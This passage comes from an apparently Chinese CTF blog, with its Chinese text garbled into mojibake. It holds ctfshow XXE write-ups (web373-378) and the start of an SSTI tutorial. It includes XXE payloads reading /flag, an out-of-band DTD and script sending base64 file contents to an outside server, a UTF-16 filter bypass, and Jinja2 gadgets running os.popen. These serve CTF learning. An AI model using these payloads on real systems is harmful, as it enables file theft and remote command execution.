title="å¦‚ä½•é˜²å¾¡xxeæ”»å‡»"></a>å¦‚ä½•é˜²å¾¡xxeæ”»å‡»</h4><p>æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</p><pre class="language-markup" data-language="markup"><code class="language-markup">PHPï¼šlibxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonï¼šfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®<br>å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚</p><h3 id="web373-378"><a href="#web373-378" class="headerlink" title="web373-378"></a>web373-378</h3><h4 id="web373-æœ‰å›æ˜¾xxe-å¤–éƒ¨å®ä½“"><a href="#web373-æœ‰å›æ˜¾xxe-å¤–éƒ¨å®ä½“" class="headerlink" title="web373(æœ‰å›æ˜¾xxe å¤–éƒ¨å®ä½“)"></a>web373(æœ‰å›æ˜¾xxe å¤–éƒ¨å®ä½“)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å…è®¸åŠ è½½å¤–éƒ¨å®ä½“</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// xmlæ–‡ä»¶æ¥æºäºæ•°æ®æµ</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// åŠ è½½xmlå®ä½“ï¼Œå‚æ•°ä¸ºæ›¿ä»£å®ä½“ã€åŠ è½½å¤–éƒ¨å­é›†</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// èŠ‚ç‚¹åµŒå¥—</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">ctfshow</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$ctfshow</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>æ³¨æ„è¿™é‡Œæ˜¯ <code>echo $creds-&gt;ctfshow;</code>ï¼Œè¦å°†è¿”å›çš„æ•°æ®åŒ…æ‹¬åœ¨ <code>&lt;ctfshow&gt;</code> ä¸­ã€‚<br>payload:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">hsad</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">hsad</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>&lt;!ENTITY payload SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hsad</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&payload;">&amp;payload;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hsad</span><span class="token punctuation">></span></span></code></pre><h4 id="web374-æ— å›æ˜¾xxe-å¤–éƒ¨å®ä½“"><a href="#web374-æ— å›æ˜¾xxe-å¤–éƒ¨å®ä½“" class="headerlink" title="web374(æ— å›æ˜¾xxe å¤–éƒ¨å®ä½“)"></a>web374(æ— å›æ˜¾xxe å¤–éƒ¨å®ä½“)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>æ²¡æœ‰å›æ˜¾ï¼Œè¦æŠŠè¯»å–åˆ°çš„å†…å®¹ä¹Ÿå°±æ˜¯flagä¼ åˆ°è¿œç¨‹æœåŠ¡å™¨æŸ¥çœ‹</p><p>åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»º<code>xxe.php</code>å’Œ<code>payload.dtd</code>æ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"># xxe.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xxe</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$xxe</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd"># payload.dtd&lt;!ENTITY % all&quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;xxx&#x2F;xxe.php?q&#x3D;%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>ç„¶åå‘é€POSTè¯·æ±‚</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;payload.dtd&quot;&gt;%dtd;%send;] &gt;</code></pre><h4 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"/'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>ç›¸è¾ƒäºä¸Šé¢˜ï¼Œå¤šäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿‡æ»¤äº†<code>&lt;?xml version=&quot;1.0&quot;</code>è¿™ä¸ªå­—ç¬¦ä¸²</p><p>å¯ä»¥å¤šæ‰“å‡ ä¸ªç©ºæ ¼ç»•è¿‡æˆ–è€…ç›´æ¥ä¸å†™å£°æ˜ä¹Ÿå¯ä»¥</p><p>ä¸Šé¢˜åšæ³•åŒæ ·å¯ä»¥</p><h4 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h4><p>ç›¸è¾ƒäºä¸Šé¢˜ï¼Œè¿‡æ»¤äº†<code>&lt;?xml version=&quot;1.0&quot;</code>è¿™ä¸ªå­—ç¬¦ä¸²åŒæ—¶ï¼Œ<code>/i</code>æ¨¡å¼æŠŠå¤§å°å†™éƒ½è¿‡æ»¤äº†ã€‚</p><p>ä¾æ—§ä»¥ä¸Šæ–¹æ³•</p><h4 id="web377-UTF-16"><a href="#web377-UTF-16" class="headerlink" title="web377(UTF-16)"></a>web377(UTF-16)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"|http/i'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   </span></code></pre><p>è¿‡æ»¤äº†http</p><p>å¯ä»¥ç”¨UTF-16ç»•è¿‡</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ee601bc7-6229-49ad-af80-541d5a0b662c.challenge.ctf.show/'</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % dtd SYSTEM "http://156.238.233.95/xxe/payload.dtd">%dtd;%send;] >"""</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span></code></pre><h4 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h4><p>å¼€å§‹æ˜¯ä¸ªç™»å½•æ¡†ï¼Œéšä¾¿è¾“å…¥åæŠ“åŒ…</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY hsad SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>ç›´æ¥æ‰“å°±è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-ssti</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>SSTIä¸»è¦ä¸ºpythonçš„ä¸€äº›æ¡†æ¶ jinja2 mako tornado djangoï¼ŒPHPæ¡†æ¶smarty twigï¼Œjavaæ¡†æ¶jade velocityç­‰ç­‰ä½¿ç”¨äº†æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ï¼Œä¸»è¦æ˜¯ç¨‹åºå‘˜å¯¹ä»£ç ä¸è§„èŒƒä¸ä¸¥è°¨é€ æˆäº†æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œé€ æˆæ¨¡æ¿å¯æ§ã€‚</p><p><a href="https://blog.csdn.net/qq_51096893/article/details/122020518">Bugku CTFâ€”â€”WEBä¹‹SSTIå­¦ä¹ ç¬”è®°_ctf ssti-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/dojo-lzz/p/5518474.html">æµ…è°ˆæ¨¡æ¿å¼•æ“ - æœ¨çš„æ ‘ - åšå®¢å›­</a></p><p><a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p><h4 id="Flaskï¼š"><a href="#Flaskï¼š" class="headerlink" title="Flaskï¼š"></a>Flaskï¼š</h4><p>Flaskæ˜¯ä¸€ä¸ªPythonç¼–å†™çš„Web å¾®æ¡†æ¶ï¼Œè®©æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Pythonè¯­è¨€å¿«é€Ÿå®ç°ä¸€ä¸ªç½‘ç«™æˆ–WebæœåŠ¡ï¼Œåœ¨ä»‹ç»Flaskä¹‹å‰é¦–å…ˆæ¥èŠä¸‹å®ƒå’ŒDjangoçš„è”ç³»ä»¥åŠåŒºåˆ«ï¼Œdjangoä¸ªå¤§è€Œå…¨çš„webæ¡†æ¶ï¼Œå®ƒå†…ç½®è®¸å¤šæ¨¡å—ï¼Œflaskæ˜¯ä¸€ä¸ªå°è€Œç²¾çš„è½»é‡çº§æ¡†æ¶ï¼ŒDjangoåŠŸèƒ½å¤§è€Œå…¨ï¼ŒFlaskåªåŒ…å«åŸºæœ¬çš„é…ç½®, Djangoçš„ä¸€ç«™å¼è§£å†³çš„æ€è·¯ï¼Œèƒ½è®©å¼€å‘è€…ä¸ç”¨åœ¨å¼€å‘ä¹‹å‰å°±åœ¨é€‰æ‹©åº”ç”¨çš„åŸºç¡€è®¾æ–½ä¸ŠèŠ±è´¹å¤§é‡æ—¶é—´ã€‚Djangoæœ‰æ¨¡æ¿ï¼Œè¡¨å•ï¼Œè·¯ç”±ï¼ŒåŸºæœ¬çš„æ•°æ®åº“ç®¡ç†ç­‰ç­‰å†…å»ºåŠŸèƒ½ã€‚ä¸ä¹‹ç›¸åï¼ŒFlaskåªæ˜¯ä¸€ä¸ªå†…æ ¸ï¼Œé»˜è®¤ä¾èµ–äº2ä¸ªå¤–éƒ¨åº“ï¼š Jinja2 æ¨¡æ¿å¼•æ“å’Œ WSGIå·¥å…·é›†â€“Werkzeug , flaskçš„ä½¿ç”¨ç‰¹ç‚¹æ˜¯åŸºæœ¬æ‰€æœ‰çš„å·¥å…·ä½¿ç”¨éƒ½ä¾èµ–äºå¯¼å…¥çš„å½¢å¼å»æ‰©å±•ï¼Œflaskåªä¿ç•™äº†webå¼€å‘çš„æ ¸å¿ƒåŠŸèƒ½ã€‚</p><p><img src="begin_1.png" alt="img" loading="lazy"></p><p><img src="begin_2.png" alt="img" loading="lazy"></p><h4 id="Pythoné­”æœ¯æ–¹æ³•"><a href="#Pythoné­”æœ¯æ–¹æ³•" class="headerlink" title="Pythoné­”æœ¯æ–¹æ³•"></a>Pythoné­”æœ¯æ–¹æ³•</h4><p><strong>class</strong>#æŸ¥æ‰¾å½“å‰ç±»å‹çš„æ‰€å±å¯¹è±¡</p><p><strong>base</strong>_# æ²¿ç€çˆ¶å­ç±»çš„å…³ç³»å¾€ä¸Šèµ°ä¸€ä¸ª</p><p><strong>mro</strong> # æŸ¥æ‰¾å½“å‰ç±»å¯¹è±¡çš„æ‰€æœ‰ç»§æ‰¿ç±»</p><p><strong>subclasses</strong> ()# æŸ¥æ‰¾çˆ¶ç±»ä¸‹çš„æ‰€æœ‰å­ç±»</p><p><strong>init</strong> #æŸ¥çœ‹ç±»æ˜¯å¦é‡è½½ï¼Œé‡è½½æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡Œæ—¶å°±å·²ç»åŠ è½½å¥½äº†è¿™ä¸ªæ¨¡å—åˆ°å†…å­˜ä¸­å¦‚æœå‡ºç°wrapperå­—çœ¼ï¼Œè¯´æ˜æ²¡æœ‰é‡è½½</p><p><strong>globals</strong> #å‡½æ•°ä¼šè®®å­—å…¸çš„å½¢å¼è¿”å›å½“å‰å¯¹è±¡çš„å…¨éƒ¨å…¨å±€å˜é‡</p><p><img src="begin_3.png" alt="img" loading="lazy"></p><p><strong>jinjiaæ ¼å¼</strong></p><pre class="language-python" data-language="python"><code class="language-python">æ§åˆ¶ç»“æ„ <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>å˜é‡å–å€¼ <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>æ³¨é‡Š <span class="token punctuation">&#123;</span><span class="token comment"># #&#125;</span></code></pre><p><strong>äº†è§£pythonçš„å‡ ä¸ªå‡½æ•°è§£æ</strong></p><pre class="language-python" data-language="python"><code class="language-python">__class__            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚__base__             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»__bases__            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases____mro__              æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>     è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach <span class="token keyword">class</span> <span class="token class-name">keeps</span> a <span class="token builtin">list</span> of weak references to its immediate subclasses<span class="token punctuation">.</span> This method returns a <span class="token builtin">list</span> of <span class="token builtin">all</span> those references still alive<span class="token punctuation">.</span> The <span class="token builtin">list</span> <span class="token keyword">is</span> <span class="token keyword">in</span> definition order<span class="token punctuation">.</span>__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function__globals__          ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å<span class="token punctuation">.</span>__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ<span class="token punctuation">.</span>æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>ï¼Œå°±æ˜¯a<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚<span class="token builtin">__import__</span>           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>å«æœ‰current_appã€‚get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>å«æœ‰current_appã€‚lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum<span class="token punctuation">.</span>__globals__å«æœ‰osæ¨¡å—ï¼š<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–<span class="token builtin">open</span>å‡½æ•°<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token 